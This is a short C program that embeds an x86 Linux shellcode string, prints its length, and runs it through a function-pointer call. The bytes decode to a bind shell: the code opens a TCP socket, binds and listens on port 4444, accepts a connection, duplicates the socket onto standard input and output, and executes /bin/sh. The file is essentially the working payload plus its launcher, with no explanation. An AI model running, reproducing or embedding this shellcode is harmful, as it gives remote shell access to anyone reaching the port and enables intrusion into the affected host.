#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x6a\x01\x6a\x02\x31\xc9\x89\xe1\xb0\x66\x31\xdb\xb3\x01\xcd\x80\x89\xc6\x31\xdb\x53\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x6a\x01\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x50\x50\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
